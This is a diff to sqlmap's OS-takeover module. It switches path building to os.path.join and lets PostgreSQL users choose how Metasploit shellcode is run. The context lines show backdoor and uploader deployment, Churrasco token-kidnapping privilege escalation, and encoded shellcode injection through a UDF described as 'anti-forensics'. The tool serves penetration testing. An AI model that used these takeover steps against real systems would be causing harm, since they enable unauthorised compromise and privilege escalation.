@@ -163,9 +163,9 @@ class Takeover(Abstraction, Metasploit, Registry):
                 logger.warn("invalid value, it must be 1 or 3")
 
         backdoorName = "backdoor.%s" % language
-        backdoorPath = "%s/%s" % (paths.SQLMAP_SHELL_PATH, backdoorName)
+        backdoorPath = os.path.join(paths.SQLMAP_SHELL_PATH, backdoorName)
         uploaderName = "uploader.%s" % language
-        uploaderStr  = fileToStr("%s/%s" % (paths.SQLMAP_SHELL_PATH, uploaderName))
+        uploaderStr  = fileToStr(os.path.join(paths.SQLMAP_SHELL_PATH, uploaderName))
 
         for directory in directories:
             # Upload the uploader agent
@@ -250,7 +250,7 @@ class Takeover(Abstraction, Metasploit, Registry):
 
         if not output or output[0] in ( "y", "Y" ):
             # TODO: add also compiled/packed Churrasco for Windows 2008
-            wFile = "%s/tokenkidnapping/Churrasco.exe" % paths.SQLMAP_CONTRIB_PATH
+            wFile = os.path.join(paths.SQLMAP_CONTRIB_PATH, "tokenkidnapping", "Churrasco.exe")
 
             self.churrascoPath    = "%s/sqlmapchur%s.exe" % (conf.tmpPath, randomStr(lowercase=True))
             self.cmdFromChurrasco = True
@@ -307,7 +307,7 @@ class Takeover(Abstraction, Metasploit, Registry):
 
         goUdf = False
 
-        if kb.dbms == "MySQL":
+        if kb.dbms in ( "MySQL", "PostgreSQL" ):
             msg  = "how do you want to execute the Metasploit shellcode "
             msg += "on the back-end database underlying operating system?"
             msg += "\n[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)"
@@ -329,9 +329,6 @@ class Takeover(Abstraction, Metasploit, Registry):
 
             if choice == 1:
                 goUdf = True
-
-        elif kb.dbms == "PostgreSQL":
-            goUdf = True
 
         if goUdf is True:
             self.createMsfShellcode(exitfunc="thread", format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
